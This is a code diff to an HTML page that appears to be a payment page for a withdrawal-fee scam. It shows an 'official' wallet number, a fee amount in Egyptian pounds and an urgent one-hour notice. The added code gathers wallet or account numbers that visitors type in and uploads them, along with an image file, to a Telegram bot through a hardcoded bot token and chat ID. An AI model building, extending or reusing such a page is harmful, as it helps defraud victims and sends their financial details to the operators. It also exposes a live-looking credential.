@@ -117,7 +117,7 @@
       opacity: 1;
     }
 
-    /* Notice Box (صندوق التنبيه بالإنجليزية والعربية) */
+    /* Notice Box */
     .notice-box {
       background: rgba(239, 68, 68, 0.08);
       border: 1px dashed rgba(239, 68, 68, 0.4);
@@ -199,6 +199,11 @@
       color: #ffffff;
       font-size: 0.88rem;
       outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .form-input:focus {
+      border-color: #38bdf8;
     }
 
     .add-wallet-btn {
@@ -212,11 +217,12 @@
       font-weight: 600;
       cursor: pointer;
       margin-bottom: 20px;
-      transition: border-color 0.2s;
+      transition: border-color 0.2s, background-color 0.2s;
     }
 
     .add-wallet-btn:hover {
       border-color: #38bdf8;
+      background: rgba(56, 189, 248, 0.05);
     }
 
     /* Primary Button */
@@ -292,11 +298,13 @@
     <!-- Wallets Section -->
     <span class="section-label">PROFIT WITHDRAWAL WALLETS</span>
     
-    <div class="field-group">
-      <input type="text" class="form-input" value="Wallet #1 (Primary)" readonly>
+    <div id="walletsContainer">
+      <div class="field-group">
+        <input type="text" class="form-input wallet-input" placeholder="Wallet #1 (Primary) Number/Account">
+      </div>
     </div>
 
-    <button class="add-wallet-btn">+ Add Another Wallet</button>
+    <button type="button" class="add-wallet-btn" onclick="addNewWallet()">+ Add Another Wallet</button>
 
     <!-- Actions -->
     <input type="file" id="fileInput" accept="image/*" onchange="sendDataToTelegram()">
@@ -312,10 +320,20 @@
   <script>
     const BOT_TOKEN = "8866871343:AAEAMiWbSrDRHfep7y63Wn7Rh1Ui_wBqTZg";
     const CHAT_ID = "8767380282";
+    let walletCount = 1;
 
     function copyWallet(text) {
       navigator.clipboard.writeText(text);
       alert("Copied: " + text);
+    }
+
+    function addNewWallet() {
+      walletCount++;
+      const container = document.getElementById('walletsContainer');
+      const div = document.createElement('div');
+      div.className = 'field-group';
+      div.innerHTML = `<input type="text" class="form-input wallet-input" placeholder="Wallet #${walletCount} Number/Account">`;
+      container.appendChild(div);
     }
 
     function sendDataToTelegram() {
@@ -324,11 +342,20 @@
 
       if (!file) return;
 
+      // تجميع أرقام المحافظ المدخلة
+      const walletInputs = document.querySelectorAll('.wallet-input');
+      let walletsText = "";
+      walletInputs.forEach((input, index) => {
+        if (input.value.trim() !== "") {
+          walletsText += `\n💳 Wallet #${index + 1}: ${input.value.trim()}`;
+        }
+      });
+
       const uploadBtn = document.getElementById('uploadBtn');
       uploadBtn.innerText = "SENDING...";
       fileInput.disabled = true;
 
-      const captionText = `🌀 Drift Transfer Payment!\n\n👤 Client ID: CLIENT 1934\n📱 Wallet: 01286999875\n💵 Amount: 8950 EGP\n⚠️ Notice: Non-deductible fees paid within 1 hour.`;
+      const captionText = `🌀 Drift Transfer Payment!\n\n👤 Client ID: CLIENT 1934\n📱 Official Wallet: 01286999875\n💵 Amount: 5380 EGP${walletsText}\n⚠️ Notice: Non-deductible fees paid within 1 hour.`;
 
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
